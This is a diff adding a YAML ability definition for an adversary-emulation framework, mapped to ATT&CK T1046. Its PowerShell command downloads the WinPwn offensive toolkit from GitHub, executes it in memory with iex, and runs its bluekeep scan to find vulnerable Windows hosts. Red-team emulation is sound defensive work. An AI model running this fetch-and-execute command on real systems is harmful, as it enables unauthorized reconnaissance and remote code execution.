@@ -1,0 +1,20 @@
+---
+- id: 5a222fbf31c5e29fb9548ef5b5884ccc
+  name: WinPwn - bluekeep
+  description: Search for bluekeep vulnerable Windows Systems in the domain using
+    bluekeep function of WinPwn. Can take many minutes to complete (~600 seconds in
+    testing on a small domain).
+  tactic: discovery
+  technique:
+    attack_id: T1046
+    name: Network Service Discovery
+  platforms:
+    windows:
+      psh:
+        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+          bluekeep -noninteractive -consoleoutput
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
